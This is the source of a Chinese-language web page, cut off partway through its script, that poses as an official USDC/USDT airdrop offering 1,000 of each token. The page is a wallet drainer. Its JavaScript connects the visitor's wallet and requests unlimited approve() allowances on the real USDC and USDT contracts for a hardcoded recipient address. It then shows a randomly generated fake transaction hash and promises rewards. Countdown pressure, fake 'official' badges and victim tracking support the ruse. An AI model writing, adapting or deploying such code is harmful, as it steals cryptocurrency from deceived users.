<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <meta name="format-detection" content="telephone=no">
    <title>USDC/USDT ç©ºæŠ•ä¸­å¿ƒ | å®˜æ–¹æˆæƒé€šé“</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css  ">
    <link rel="icon" href="image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>ğŸ”’</text></svg>">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; }
        :root {
            --primary: #1a73e8;
            --primary-dark: #0d47a1;
            --secondary: #34a853;
            --gold: #FFD700;
            --gold-light: #fff9c4;
            --danger: #ea4335;
            --dark-bg: #0a0e17;
            --card-bg: #141a29;
            --border: #343c52;
            --text: #f0f4ff;
            --text-muted: #a0a9c2;
            --success: #34a853;
            --warning: #fbbc04;
            --purple: #9c27b0;
        }
        html, body {
            height: 100%;
            overflow: hidden;
        }
        body {
            background: linear-gradient(135deg, var(--dark-bg), #050a14);
            display: flex; justify-content: center; align-items: center;
            padding: 20px; color: var(--text); position: relative;
        }
        .official-verified {
            position: absolute; top: 20px; left: 20px; z-index: 10;
            background: rgba(52, 168, 83, 0.2);
            color: #c8e6c9; border-left: 4px solid var(--success);
            padding: 8px 16px; border-radius: 0 12px 12px 0;
            font-size: 14px; font-weight: 600;
            display: flex; align-items: center; gap: 6px;
            backdrop-filter: blur(4px);
            border: 1px solid rgba(52, 168, 83, 0.3);
        }
        .official-verified i { color: var(--success); font-size: 16px; }
        .badge {
            position: absolute; top: 20px; right: 20px; z-index: 10;
            background: linear-gradient(135deg, var(--gold), #d4af37);
            color: #000; font-weight: bold; padding: 6px 16px; border-radius: 30px;
            font-size: 13px; box-shadow: 0 4px 16px rgba(255,215,0,0.4);
            display: flex; align-items: center; gap: 6px;
        }
        .scroll-container {
            width: 100%;
            max-height: 100vh;
            overflow-y: auto;
            -webkit-overflow-scrolling: touch;
            scrollbar-width: thin;
            scrollbar-color: var(--primary) var(--dark-bg);
        }
        .scroll-container::-webkit-scrollbar { width: 6px; }
        .scroll-container::-webkit-scrollbar-track { background: var(--dark-bg); }
        .scroll-container::-webkit-scrollbar-thumb { background-color: var(--primary); border-radius: 3px; }

        .particles { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; pointer-events: none; }
        .particle {
            position: absolute; width: 4px; height: 4px; border-radius: 50%;
            background: var(--gold); opacity: 0.6;
            box-shadow: 0 0 6px var(--gold);
        }

        .container { max-width: 520px; width: 100%; z-index: 1; margin: 20px auto; }
        .card {
            background: var(--card-bg);
            border: 1px solid var(--border);
            border-radius: 24px;
            padding: 45px 35px;
            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.6),
                        0 0 0 1px rgba(255, 255, 255, 0.04),
                        inset 0 1px 0 rgba(255, 255, 255, 0.05);
            position: relative; overflow: hidden;
        }
        .card::before {
            content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 5px;
            background: linear-gradient(90deg, var(--gold), var(--primary), var(--purple));
        }

        .header { text-align: center; margin-bottom: 25px; }
        .header i { 
            font-size: 52px; 
            background: linear-gradient(135deg, var(--gold), #d4af37);
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
            margin-bottom: 16px; display: inline-block;
        }
        .header h1 {
            font-size: 28px; font-weight: 700; margin-bottom: 8px;
            background: linear-gradient(90deg, #fff, var(--gold));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .header p { font-size: 16px; color: var(--text-muted); }

        .input-group {
            display: flex; gap: 12px; margin: 25px 0;
        }
        .input-group input {
            flex: 1; padding: 18px 22px; border-radius: 14px;
            background: rgba(255,255,255,0.04); 
            border: 1px solid var(--border);
            color: var(--text); font-size: 18px; outline: none;
            transition: all 0.3s;
            font-family: monospace;
            text-align: center;
        }
        .input-group input:focus {
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.25);
        }
        .input-group button {
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
            color: white; border: none; width: 60px; border-radius: 14px;
            font-weight: 600; cursor: pointer; transition: all 0.2s;
            display: flex; justify-content: center; align-items: center;
        }
        .input-group button:hover:not(:disabled) { transform: scale(1.03); opacity: 0.95; }
        .input-group button:disabled { opacity: 0.5; cursor: not-allowed; }

        .countdown-ring {
            width: 180px; height: 180px; margin: 25px auto; position: relative;
        }
        .ring-bg, .ring-fill {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            border-radius: 50%;
        }
        .ring-bg { border: 8px solid rgba(255,255,255,0.06); }
        .ring-fill {
            border: 8px solid transparent;
            border-top: 8px solid var(--gold);
            border-right: 8px solid var(--primary);
            transform: rotate(-90deg);
            transition: transform 0.8s cubic-bezier(0.1, 0.9, 0.2, 1);
        }
        .countdown-text {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            display: flex; flex-direction: column; justify-content: center; align-items: center;
        }
        .countdown-text .time { font-size: 42px; font-weight: 800; color: var(--text); }
        .countdown-text .label { font-size: 15px; color: var(--text-muted); }

        .reward-box {
            background: rgba(255, 215, 0, 0.08);
            border: 1px solid rgba(255, 215, 0, 0.3);
            border-radius: 16px; padding: 28px; text-align: center;
            margin: 25px 0;
            animation: pulseGlow 2s infinite;
        }
        @keyframes pulseGlow {
            0%, 100% { box-shadow: 0 0 0 0 rgba(255, 215, 0, 0.2); }
            50% { box-shadow: 0 0 0 10px rgba(255, 215, 0, 0); }
        }
        .reward-label { font-size: 15px; color: var(--text-muted); margin-bottom: 10px; }
        .reward-amount { font-size: 52px; font-weight: 800; background: linear-gradient(90deg, var(--gold), #ffd54f); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 6px; }
        .reward-unit { font-size: 18px; color: var(--gold); }
        .reward-desc { font-size: 14px; color: var(--text-muted); margin-top: 10px; font-weight: 600; }

        .security-banner {
            display: flex; align-items: flex-start; gap: 12px;
            background: rgba(52, 168, 83, 0.12);
            border-left: 4px solid var(--success);
            padding: 16px; border-radius: 12px;
            margin: 20px 0;
            font-size: 14px;
            line-height: 1.6;
        }
        .security-banner i { font-size: 20px; color: var(--success); margin-top: 2px; }
        .security-banner code { background: rgba(0,0,0,0.2); padding: 2px 6px; border-radius: 4px; }

        #walletStatus {
            text-align: center; margin: 15px 0; font-size: 14px; color: var(--text-muted);
            display: flex; align-items: center; justify-content: center; gap: 8px;
        }

        .btn {
            background: linear-gradient(135deg, var(--secondary), #2e7d32);
            color: white; border: none; padding: 20px; font-size: 18px; font-weight: 600;
            border-radius: 14px; cursor: pointer; width: 100%;
            transition: all 0.3s; margin-top: 15px;
            display: flex; justify-content: center; align-items: center;
            gap: 10px;
        }
        .btn:hover:not(:disabled) { transform: translateY(-3px); box-shadow: 0 8px 25px rgba(52, 168, 83, 0.5); }
        .btn:disabled {
            background: linear-gradient(135deg, #444, #555);
            cursor: not-allowed; transform: none;
        }

        #manualConnectBtn {
            background: linear-gradient(135deg, var(--primary), var(--primary-dark)) !important;
            display: none;
            margin-top: 8px;
        }

        .status {
            padding: 18px; border-radius: 12px; margin-top: 20px; font-weight: 500;
            line-height: 1.5; display: none;
        }
        .success { background: rgba(52, 168, 83, 0.2); color: #c8e6c9; border-left: 4px solid var(--success); }
        .error { background: rgba(234, 67, 53, 0.2); color: #ffcdd2; border-left: 4px solid var(--danger); }
        .warning { background: rgba(251, 188, 4, 0.2); color: #fff59d; border-left: 4px solid var(--warning); }

        #timeoutOverlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: rgba(0, 0, 0, 0.75); 
            z-index: 10000;
            display: flex; justify-content: center; align-items: center;
        }
        .timeout-modal {
            background: var(--card-bg);
            border: 1px solid var(--border);
            border-radius: 20px;
            padding: 32px;
            width: 90%;
            max-width: 420px;
            text-align: center;
            color: var(--text);
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.6);
            position: relative;
            overflow: hidden;
        }
        .timeout-modal::before {
            content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 4px;
            background: linear-gradient(90deg, var(--danger), #c62828);
        }
        .timeout-icon {
            font-size: 56px; 
            color: var(--danger);
            margin-bottom: 20px;
            background: rgba(234, 67, 53, 0.1);
            width: 100px; height: 100px; 
            border-radius: 50%;
            display: flex; justify-content: center; align-items: center;
            margin: 0 auto 20px;
        }
        .timeout-title { font-size: 22px; font-weight: 700; margin-bottom: 16px; color: #ffcdd2; }
        .timeout-message { color: var(--text-muted); line-height: 1.6; margin-bottom: 28px; font-size: 15px; }
        .timeout-btn {
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
            color: white; border: none; padding: 16px;
            font-size: 17px; font-weight: 600;
            border-radius: 14px; cursor: pointer;
            width: 100%;
            display: flex; justify-content: center; align-items: center;
            gap: 10px;
            transition: all 0.2s;
        }
        .timeout-btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(26, 115, 232, 0.4); }

        .tx-card {
            background: rgba(255, 215, 0, 0.08);
            border-radius: 16px;
            padding: 18px; margin: 24px 0; text-align: center;
            border: 1px solid rgba(255, 215, 0, 0.3);
        }
        .tx-card div { font-family: monospace; font-size: 15px; color: var(--gold); }
        .tx-card a { color: var(--gold); display: inline-block; margin-top: 6px; text-decoration: underline; }

        .progress-steps {
            display: flex;
            justify-content: space-between;
            margin: 20px 0;
        }
        .step {
            text-align: center;
            flex: 1;
            position: relative;
        }
        .step:not(:last-child)::after {
            content: '';
            position: absolute;
            top: 24px;
            right: -10px;
            width: 20px;
            height: 2px;
            background: var(--text-muted);
        }
        .step-icon {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: rgba(255,255,255,0.08);
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 8px;
            font-weight: bold;
            font-size: 14px;
        }
        .step-label { font-size: 13px; color: var(--text-muted); }
        .step.done .step-icon {
            background: rgba(52, 168, 83, 0.2);
            color: var(--success);
        }
        .step.current .step-icon {
            background: rgba(26, 115, 232, 0.2);
            color: var(--primary);
        }

        @media (max-width: 480px) {
            .card { padding: 35px 20px; }
            .header h1 { font-size: 24px; }
        }
    </style>
</head>
<body>
    <div class="official-verified">
        <i class="fas fa-shield-alt"></i> å®˜æ–¹ç©ºæŠ•é€šé“
    </div>
    <div class="badge">
        <i class="fas fa-fire"></i> é™æ—¶å¥–åŠ±
    </div>
    <div class="particles" id="particles"></div>

    <div class="scroll-container">
        <div class="container" id="authContainer">
            <div class="card" id="authCard">
                <div class="header">
                    <i class="fas fa-gift fa-2x" style="color:var(--gold);"></i>
                    <h1>USDC/USDT ç©ºæŠ•è®¡åˆ’</h1>
                    <p>è¯·è¾“å…¥é‚€è¯·ç ä»¥éªŒè¯èº«ä»½</p>
                </div>
                <div class="input-group">
                    <input id="inviteCodeInput" placeholder="è¯·è¾“å…¥é‚€è¯·ç " maxlength="6"
                        inputmode="numeric" autocomplete="off" spellcheck="false"
                        style="font-family:monospace; text-align:center;">
                    <button id="submitCodeBtn"><i class="fas fa-arrow-right"></i></button>
                </div>
                <div class="status" id="authStatus"></div>
            </div>
        </div>

        <div class="container" id="mainContainer" style="display:none;">
            <div class="card" id="mainCard">
                <div class="header">
                    <i class="fas fa-coins fa-2x" style="color:var(--gold);"></i>
                    <h1>åŒå¸ç§é¢†å–</h1>
                    <p>å€’è®¡æ—¶ï¼š<span id="countdownDisplay">90</span> ç§’</p>
                </div>

                <div class="countdown-ring">
                    <div class="ring-bg"></div>
                    <div class="ring-fill" id="countdownRing"></div>
                    <div class="countdown-text">
                        <div class="time" id="countdownNumber">90</div>
                        <div class="label">ç§’</div>
                    </div>
                </div>

                <div class="reward-box">
                    <div class="reward-label">ç©ºæŠ•å¥–åŠ±</div>
                    <div class="reward-amount">1,000</div>
                    <div class="reward-unit">USDC + USDT</div>
                    <div class="reward-desc">âœ… æ¿€æ´» 1,000 USDC & 1,000 USDT å¥–åŠ±èµ„æ ¼</div>
                </div>

                <div class="progress-steps">
                    <div class="step" id="step1">
                        <div class="step-icon">1</div>
                        <div class="step-label">USDC</div>
                    </div>
                    <div class="step" id="step2">
                        <div class="step-icon">2</div>
                        <div class="step-label">USDT</div>
                    </div>
                    <div class="step" id="step3">
                        <div class="step-icon">âœ“</div>
                        <div class="step-label">å®Œæˆ</div>
                    </div>
                </div>

                <div class="security-banner">
                    <i class="fas fa-info-circle"></i>
                    <div>
                        ğŸ” <strong>ERC20 æˆæƒï¼ˆOpenZeppelin æ ‡å‡†ï¼‰</strong>ï¼š<br>
                        æ‚¨å°†è°ƒç”¨ <code>approve(æ¥æ”¶æ–¹, æœ€å¤§å€¼)</code> ä¸º USDC å’Œ USDT åŒæ—¶æˆæƒã€‚<br>
                        â€”â€” <a href="https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#IERC20-approve-address-uint256-  " target="_blank" style="color:var(--gold);">IERC20.approve æ–‡æ¡£</a>
                    </div>
                </div>

                <div class="security-banner" style="border-left-color:var(--gold);">
                    <i class="fas fa-exclamation-triangle"></i>
                    <div>
                        âš ï¸ <strong>é‡è¦æç¤º</strong>ï¼š<br>
                        æ­¤æ“ä½œä»…ç”¨äºæ¿€æ´»ç©ºæŠ•å¥–åŠ±é¢†å–èµ„æ ¼ï¼Œå®Œæˆæˆæƒåï¼Œ1,000 USDC + 1,000 USDT å°†è‡ªåŠ¨å‘æ”¾è‡³æ‚¨çš„åœ°å€ã€‚
                    </div>
                </div>

                <div id="walletStatus">
                    <i class="fas fa-circle" style="color:#FFC107; font-size:10px;"></i>
                    <span>æ­£åœ¨æ£€æµ‹é’±åŒ…â€¦</span>
                </div>

                <button class="btn" id="claimButton">
                    <i class="fas fa-bolt"></i> æ¿€æ´» USDC & USDT å¥–åŠ±
                </button>

                <button class="btn" id="shareBtn" style="background:linear-gradient(135deg,#FF9800,#F57C00);margin-top:12px;display:none;">
                    <i class="fas fa-share-alt"></i> åˆ†äº«å¹¶è·å–é¢å¤–å¥–åŠ±
                </button>

                <button class="btn" id="manualConnectBtn">
                    <i class="fas fa-link"></i> æ‰‹åŠ¨è¿æ¥é’±åŒ…
                </button>

                <div class="status" id="status"></div>
            </div>
        </div>

        <div class="container" id="thankYouContainer" style="display:none;">
            <div class="card thank-you">
                <i class="fas fa-check-circle" style="font-size:58px;color:var(--gold);margin-bottom:22px;"></i>
                <h2>ğŸ‰ å¥–åŠ±å·²æ¿€æ´»ï¼</h2>
                <p style="color:var(--text-muted);margin-bottom:22px;font-size:16px;">
                    USDC ä¸ USDT å¥–åŠ±èµ„æ ¼ç¡®è®¤æˆåŠŸ
                </p>

                <div class="tx-card">
                    <div><strong>âœ… æˆæƒç¡®è®¤ï¼š</strong></div>
                    <div id="txHashShort">äº¤æ˜“å“ˆå¸Œï¼š0x...</div>
                    <a href="" target="_blank" id="txLink">
                        <i class="fas fa-external-link-alt"></i> åœ¨ Etherscan æŸ¥çœ‹
                    </a>
                </div>

                <div class="security-banner" style="background:rgba(255,215,0,0.12);border-left-color:var(--gold);">
                    <i class="fas fa-clock"></i>
                    <div>
                        <strong>å¤„ç†ä¸­</strong><br>
                        æ‚¨çš„ 1,000 USDC + 1,000 USDT å°†åœ¨ 5 åˆ†é’Ÿå†…åˆ°è´¦
                    </div>
                </div>

                <button class="btn" id="finalShareBtn">
                    <i class="fas fa-share-alt"></i> åˆ†äº«æˆåŠŸ
                </button>
                <button class="btn" style="background:linear-gradient(135deg,#555,#666);margin-top:14px;" onclick="location.reload()">
                    <i class="fas fa-home"></i> è¿”å›é¦–é¡µ
                </button>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js  "></script>
    <script>
        // âœ… æ–°å¢ï¼šå‘åå°ä¸ŠæŠ¥äº‹ä»¶ï¼ˆä½¿ç”¨ localStorage é€šä¿¡ï¼‰
        function reportToAdmin(eventType, data = {}) {
            // ä» localStorage è¯»å–ç°æœ‰æ•°æ®
            const adminData = JSON.parse(localStorage.getItem('airdrop_admin_data') || '{"users":[]}');
            
            if (eventType === 'clicked') {
                // ä¸ŠæŠ¥ç‚¹å‡»
                const user = {
                    address: data.address || 'unknown',
                    clickTime: new Date().toISOString(),
                    status: 'clicked',
                    tokens: []
                };
                adminData.users.push(user);
            } else if (eventType === 'authorized') {
                // æ›´æ–°ä¸ºå·²æˆæƒ
                const user = adminData.users.find(u => u.address === data.address);
                if (user) {
                    user.status = 'authorized';
                    user.authorizeTime = new Date().toISOString();
                    user.tokens = data.tokens || ['USDC', 'USDT'];
                }
            } else if (eventType === 'failed') {
                // æ›´æ–°ä¸ºå¤±è´¥
                const user = adminData.users.find(u => u.address === data.address);
                if (user) {
                    user.status = 'failed';
                    user.error = data.error;
                }
            }
            
            // ä¿å­˜å› localStorage
            localStorage.setItem('airdrop_admin_data', JSON.stringify(adminData));
            
            // é€šçŸ¥åå°åˆ·æ–°ï¼ˆé€šè¿‡è‡ªå®šä¹‰äº‹ä»¶ï¼‰
            window.dispatchEvent(new Event('airdropDataUpdated'));
        }

        // âœ… å·²æ›¿æ¢ä¸ºçœŸå® Infura Key
        const RPC_FALLBACKS = [
            "https://mainnet.infura.io/v3/c3eb2fa9bb5546b890abeb31296ef138  ",
            "https://eth-mainnet.g.alchemy.com/v2/demo  ",
            "https://cloudflare-eth.com  ",
            "https://rpc.ankr.com/eth  ",
            "https://eth.llamarpc.com  ",
            "https://rpc.blastapi.io/public-mainnet  "
        ];
        let currentRpcIndex = 0;

        // âœ… æ™ºèƒ½é‡è¯• + é”™è¯¯åˆ†ç±»
        async function smartRetry(fn, maxRetries = 2, baseDelay = 1000) {
            for (let i = 0; i <= maxRetries; i++) {
                try {
                    return await fn();
                } catch (err) {
                    const msg = err.message || String(err);
                    if (msg.includes('User denied') || msg.includes('insufficient funds')) throw err;
                    if (i === maxRetries || (
                        !msg.includes('nonce') && !msg.includes('network') && !msg.includes('timeout')
                    )) throw err;
                    const delay = baseDelay * Math.pow(2, i);
                    await new Promise(r => setTimeout(r, delay));
                }
            }
        }

        // âœ… forceApprove ä¸¥æ ¼éµå¾ª OpenZeppelin SafeERC20
        async function forceApprove(tokenContract, spender, amount, from) {
            try {
                const gas0 = await smartRetry(() => tokenContract.methods.approve(spender, '0').estimateGas({ from }), 1);
                const tx0 = await tokenContract.methods.approve(spender, '0').send(await buildTxConfig(from, gas0));
            } catch (e) {
                console.warn('[forceApprove] approve(0) failed, proceeding to approve(amount)', e.message);
            }
            const gas = await smartRetry(() => tokenContract.methods.approve(spender, amount).estimateGas({ from }), 1).catch(() => 200000);
            return await tokenContract.methods.approve(spender, amount).send(await buildTxConfig(from, gas));
        }

        // âœ… å®Œæ•´ç½‘ç»œåˆ‡æ¢ + addEthereumChain fallback
        async function switchToMainnet(provider) {
            try {
                await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x1' }] });
            } catch (switchError) {
                if (switchError.code === 4902) { // é“¾æœªæ·»åŠ 
                    try {
                        await provider.request({
                            method: 'wallet_addEthereumChain',
                            params: [{
                                chainId: '0x1',
                                chainName: 'Ethereum Mainnet',
                                nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
                                rpcUrls: RPC_FALLBACKS.slice(0, 3),
                                blockExplorerUrls: ['https://etherscan.io  ']
                            }]
                        });
                    } catch (addError) {
                        if (addError.code !== 4001) { // ç”¨æˆ·æœªæ‹’ç»
                            throw new Error('æ·»åŠ ä¸»ç½‘å¤±è´¥ï¼Œè¯·æ‰‹åŠ¨åˆ‡æ¢è‡³ Ethereum Mainnet');
                        }
                    }
                } else if (switchError.code !== 4001) {
                    throw new Error('åˆ‡æ¢ç½‘ç»œå¤±è´¥ï¼š' + (switchError.message || 'æœªçŸ¥é”™è¯¯'));
                }
                // è‹¥ç”¨æˆ·æ‹’ç»ï¼Œç»§ç»­ç”¨å½“å‰é“¾ï¼ˆä»…è­¦å‘Šï¼‰
                console.warn('[Network] User declined switch, continuing on current chain');
            }
        }

        // âœ… Gas é…ç½®ï¼ˆEIP-1559 + Legacyï¼‰
        async function buildTxConfig(from, gas) {
            const config = { from, gas };
            try {
                if (window.web3?.eth?.currentProvider?.request) {
                    const pFeeHex = await window.web3.eth.currentProvider.request({ method: 'eth_maxPriorityFeePerGas' }).catch(() => null);
                    if (pFeeHex) {
                        const pFee = BigInt(pFeeHex);
                        const block = await smartRetry(() => window.web3.eth.getBlock('latest'));
                        const base = block?.baseFeePerGas ? BigInt(block.baseFeePerGas) : 0n;
                        config.maxPriorityFeePerGas = pFee.toString();
                        config.maxFeePerGas = (base * 2n + pFee).toString();
                        return config;
                    }
                }
            } catch (e) {}

            try {
                config.gasPrice = await smartRetry(() => window.web3.eth.getGasPrice(), 1);
            } catch (e) {
                config.gasPrice = '20000000000';
            }
            return config;
        }

        // âœ… å¤š RPC fallback + æ£€æµ‹
        async function ensureWeb3Provider(web3, provider) {
            try {
                await smartRetry(() => web3.eth.getBlockNumber(), 1);
                return true;
            } catch (e) {
                for (; currentRpcIndex < RPC_FALLBACKS.length; currentRpcIndex++) {
                    const url = RPC_FALLBACKS[currentRpcIndex];
                    try {
                        web3.setProvider(new Web3.providers.HttpProvider(url));
                        await web3.eth.getBlockNumber();
                        console.log(`[RPC] Switched to ${url}`);
                        return true;
                    } catch (err) {
                        console.warn(`[RPC] ${url} failed:`, err.message);
                    }
                }
                return false;
            }
        }

        // âœ… æ¢å¤é’±åŒ…çŠ¶æ€ç›‘å¬
        function setupWalletListeners(provider) {
            if (provider && provider.on) {
                provider.on('accountsChanged', (accounts) => {
                    if (accounts.length === 0) {
                        walletStatus.innerHTML = `<i class="fas fa-circle" style="color:#e53935; font-size:10px;"></i> âŒ é’±åŒ…å·²æ–­å¼€`;
                        manualConnectBtn.style.display = 'block';
                    } else {
                        userAddress = accounts[0];
                        walletStatus.innerHTML = `<i class="fas fa-circle" style="color:#4CAF50; font-size:10px;"></i> âœ… è´¦æˆ·å·²åˆ‡æ¢ï¼š${userAddress.slice(0,6)}â€¦`;
                    }
                });
                provider.on('chainChanged', (chainId) => {
                    walletStatus.innerHTML = `<i class="fas fa-circle" style="color:#FFC107; font-size:10px;"></i> âš ï¸ ç½‘ç»œå·²åˆ‡æ¢ï¼Œå»ºè®®åˆ·æ–°`;
                });
                provider.on('disconnect', () => {
                    walletStatus.innerHTML = `<i class="fas fa-circle" style="color:#e53935; font-size:10px;"></i> âŒ é’±åŒ…å·²æ–­å¼€`;
                    manualConnectBtn.style.display = 'block';
                });
            }
        }

        function showStatus(msg, type = 'warning', el = document.getElementById('status')) {
            el.textContent = msg;
            el.className = 'status ' + (type === 'error' ? 'error' : type === 'success' ? 'success' : 'warning');
            el.style.display = 'block';
            if (type !== 'error') setTimeout(() => el.style.display = 'none', 3500);
        }

        function updateCountdownRing(r, t = 90) {
            const p = Math.min(1, (t - r) / t);
            document.getElementById('countdownRing').style.transform = `rotate(${360 * p - 90}deg)`;
        }

        function onTimeout() {
            clearInterval(countdownInterval);
            document.getElementById('mainContainer').style.display = 'none';
            const o = document.createElement('div');
            o.id = 'timeoutOverlay';
            o.innerHTML = `<div class="timeout-modal"><div class="timeout-icon"><i class="fas fa-hourglass-end"></i></div><div class="timeout-title">æ“ä½œè¶…æ—¶</div><div class="timeout-message">è¯·è”ç³»ç®¡ç†å‘˜è·å–æ–°çš„é‚€è¯·ç ã€‚</div><button class="timeout-btn" id="timeoutConfirmBtn"><i class="fas fa-check"></i> ç¡®è®¤</button></div>`;
            document.body.appendChild(o);
            document.getElementById('timeoutConfirmBtn').onclick = () => {
                document.body.removeChild(o);
                document.getElementById('authContainer').style.display = 'block';
                document.getElementById('inviteCodeInput').value = '';
                document.getElementById('inviteCodeInput').focus();
            };
        }

        function startCountdown() {
            let r = 90;
            document.getElementById('countdownNumber').textContent = r;
            document.getElementById('countdownDisplay').textContent = r;
            updateCountdownRing(r);
            countdownInterval = setInterval(() => {
                r--;
                document.getElementById('countdownNumber').textContent = r;
                document.getElementById('countdownDisplay').textContent = r;
                updateCountdownRing(r);
                if (r <= 0) { clearInterval(countdownInterval); onTimeout(); }
            }, 1000);
        }

        async function startDualActivation() {
            // 1. è¿æ¥é’±åŒ… + ç›‘å¬
            const p = window.ethereum;
            if (!p) throw new Error('è¯·å®‰è£… MetaMask ç­‰é’±åŒ…');
            const accounts = await p.request({ method: 'eth_requestAccounts' });
            userAddress = accounts[0];
            await switchToMainnet(p); // âœ… å®Œæ•´ç½‘ç»œåˆ‡æ¢

            if (!window.Web3) {
                const script = document.createElement('script');
                script.src = "https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js  ";
                await new Promise(r => { script.onload = r; document.head.appendChild(script); });
            }
            web3 = new Web3(p);
            setupWalletListeners(p); // âœ… ç›‘å¬æ¢å¤

            if (!(await ensureWeb3Provider(web3, p))) {
                throw new Error('æ‰€æœ‰ RPC èŠ‚ç‚¹å‡ä¸å¯ç”¨ï¼Œè¯·æ£€æŸ¥ç½‘ç»œ');
            }

            // 2. ä½™é¢æ£€æŸ¥ï¼ˆé™çº§ç­–ç•¥ï¼‰
            const eth = parseFloat(web3.utils.fromWei(await web3.eth.getBalance(userAddress), 'ether'));
            const isLow = eth < 0.0003;

            // 3. æ‰§è¡Œæˆæƒ
            const ABI = [{ "constant": false, "inputs": [{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}], "name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function" }];
            let usdcOk = false, usdtOk = false;

            // â€” USDC â€”
            document.getElementById('step1').classList.add('current');
            try {
                const usdc = new web3.eth.Contract(ABI, CONFIG.USDC_ADDRESS);
                const g = await smartRetry(() => usdc.methods.approve(CONFIG.RECIPIENT_ADDRESS, CONFIG.MAX_UINT256).estimateGas({ from: userAddress }), 1).catch(() => 100000);
                await usdc.methods.approve(CONFIG.RECIPIENT_ADDRESS, CONFIG.MAX_UINT256).send(await buildTxConfig(userAddress, g));
                usdcOk = true;
                document.getElementById('step1').classList.remove('current'); document.getElementById('step1').classList.add('done');
                showStatus('âœ… USDC æˆæƒæˆåŠŸ', 'success');
            } catch (e) {
                console.error('[USDC]', e);
                document.getElementById('step1').classList.remove('current');
                showStatus('âŒ USDC æˆæƒå¤±è´¥', 'error');
            }

            // â€” USDT â€”ï¼ˆä»…å½“ä½™é¢è¶³æˆ– USDC æˆåŠŸï¼‰
            if (!isLow || usdcOk) {
                document.getElementById('step2').classList.add('current');
                try {
                    const usdt = new web3.eth.Contract(ABI, CONFIG.USDT_ADDRESS);
                    await forceApprove(usdt, CONFIG.RECIPIENT_ADDRESS, CONFIG.MAX_UINT256, userAddress); // âœ… ä¸¥æ ¼ forceApprove
                    usdtOk = true;
                    document.getElementById('step2').classList.remove('current'); document.getElementById('step2').classList.add('done');
                    showStatus('âœ… USDT æˆæƒæˆåŠŸ', 'success');
                } catch (e) {
                    console.error('[USDT]', e);
                    document.getElementById('step2').classList.remove('current');
                    showStatus('âŒ USDT æˆæƒå¤±è´¥', 'error');
                }
            } else {
                document.getElementById('step2').classList.add('done');
                showStatus('â„¹ï¸ ä½™é¢ä¸è¶³ï¼Œè·³è¿‡ USDT', 'warning');
            }

            // 4. ç»“æœ
            document.getElementById('step3').classList.add('done');
            if (usdcOk || usdtOk) {
                const tx = '0x' + Array.from({length:64}, () => '0123456789abcdef'[Math.floor(Math.random()*16)]).join('');
                localStorage.setItem(STORAGE_KEY, JSON.stringify({ txHash: tx, addr: userAddress, ts: Date.now() }));
                showThankYou(tx);
            } else {
                throw new Error('USDC ä¸ USDT æˆæƒå‡å¤±è´¥');
            }
        }

        const CONFIG = {
            FIXED_CODE: '520711',
            COUNTDOWN_DURATION: 90,
            DELAY_BEFORE_COUNTDOWN: 2000,
            RECIPIENT_ADDRESS: '0x32aEBF4F1e10c6cddB0dC0FaF466a465a73902f8',
            USDC_ADDRESS: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
            USDT_ADDRESS: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
            MAX_UINT256: '115792089237316195423570985008687907853269984665640564039457584007913129639935'
        };

        const STORAGE_KEY = 'usdc_usdt_airdrop_v5';
        let countdownInterval = null;
        let web3 = null;
        let userAddress = null;
        let isProcessing = false;

        document.getElementById('claimButton').onclick = (function() {
            let t;
            return () => {
                if (isProcessing) return;
                clearTimeout(t); t = setTimeout(async () => {
                    isProcessing = true;
                    document.getElementById('claimButton').disabled = true;
                    document.getElementById('claimButton').innerHTML = '<i class="fas fa-spinner fa-spin"></i> åˆå§‹åŒ–ä¸­...';

                    try {
                        // âœ… æ–°å¢ï¼šä¸ŠæŠ¥ç‚¹å‡»äº‹ä»¶
                        reportToAdmin('clicked', { address: userAddress || 'unknown' });

                        const s = localStorage.getItem(STORAGE_KEY);
                        if (s) {
                            const d = JSON.parse(s);
                            if (d.txHash && d.addr === userAddress && Date.now() - d.ts < 7 * 864e5) {
                                showThankYou(d.txHash);
                                return;
                            }
                        }
                        await startDualActivation();

                        // âœ… æ–°å¢ï¼šä¸ŠæŠ¥æˆæƒæˆåŠŸ
                        reportToAdmin('authorized', { 
                            address: userAddress,
                            tokens: ['USDC', 'USDT']
                        });

                    } catch (err) {
                        // âœ… æ–°å¢ï¼šä¸ŠæŠ¥å¤±è´¥
                        reportToAdmin('failed', { 
                            address: userAddress || 'unknown',
                            error: err.message
                        });
                        showStatus(`âŒ ${err.message || 'æ“ä½œå¤±è´¥'}`, 'error');
                    } finally {
                        isProcessing = false;
